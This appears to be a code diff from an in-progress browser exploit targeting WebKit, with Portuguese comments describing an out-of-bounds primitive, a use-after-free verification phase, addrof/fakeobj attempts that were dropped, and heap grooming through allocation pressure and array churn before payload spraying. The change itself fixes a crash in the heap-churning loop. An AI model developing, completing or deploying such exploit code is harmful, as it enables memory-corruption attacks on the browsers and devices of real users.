@@ -1,10 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v10 - Verificação de UAF por Propriedade)
+// js/script3/testArrayBufferVictimCrash.mjs (v11 - Correção de RangeError no Heap Churning)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// 1. Abandono completo do 'addrof' para a verificação do UAF, devido à sua instabilidade.
-// 2. A FASE 5 agora verifica o sucesso da corrupção de memória através da leitura de
-//    propriedades de objetos, uma técnica que não depende de endereços.
-// 3. Isso nos permitirá confirmar o controle do UAF de forma definitiva.
+// 1. Corrigido o RangeError que ocorria na etapa de "agitação do heap" (churning),
+//    garantindo que o comprimento do array seja sempre um inteiro.
+// 2. Com esta correção, a verificação do UAF por propriedade deve ser concluída.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -41,8 +40,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         await triggerOOB_primitive({ force_reinit: true });
         logS3("Primitiva OOB operacional.", "good");
 
-        // FASE 2 e 3 (addrof/fakeobj) foram removidas por instabilidade.
-
+        // FASE 5: TENTATIVA DE CORRUPÇÃO CONTROLADA E VERIFICAÇÃO POR PROPRIEDADE
         logS3("--- FASE 5: Tentativa de Corrupção Controlada e Verificação por Propriedade ---", "subtest");
         
         const VICTIM_MARKER = 0xCCCCCCCC;
@@ -73,10 +71,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("Forçando GC e agitando o heap para aumentar a confiabilidade...", "debug");
         let pressure = [];
         for (let i = 0; i < 20; i++) { pressure.push(new ArrayBuffer(1024 * 1024)); }
-        pressure = []; // Tornar elegível para coleta
+        pressure = [];
         let churn = [];
-        for (let i = 0; i < 1000; i++) { churn.push(new Array(Math.random() * 100)); }
-        churn = []; // Tornar elegível para coleta
+        for (let i = 0; i < 1000; i++) {
+            // --- CORREÇÃO (v11): Usar Math.floor para garantir um comprimento de array inteiro. ---
+            churn.push(new Array(Math.floor(Math.random() * 100)));
+        }
+        churn = [];
         await PAUSE_S3(200);
 
         // 4. Alocar payloads (também como objetos) para preencher os buracos
